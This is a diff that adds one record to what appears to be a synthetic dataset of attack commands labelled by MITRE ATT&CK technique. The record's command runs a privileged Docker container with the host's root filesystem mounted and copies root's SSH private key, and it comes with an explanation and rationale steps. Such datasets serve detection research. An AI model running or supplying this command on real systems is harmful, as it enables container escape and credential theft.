@@ -1,0 +1,21 @@
+{
+  "id": "SYN-ZSH-T1611-f02cfc9c-0e96cac3",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "zsh",
+  "command": "docker run --rm --privileged -v /:/mnt ubuntu cp /mnt/root/.ssh/id_rsa /tmp/",
+  "explanation": "Copies the SSH private keys from the host's root user directory to the container's temporary directory.",
+  "rationale_steps": [
+    "Run a privileged container with the host's root filesystem mounted.",
+    "Copy the SSH private keys from the host to the container."
+  ],
+  "source_prompt_hash": "f02cfc9c",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:29:32.063558Z"
+}
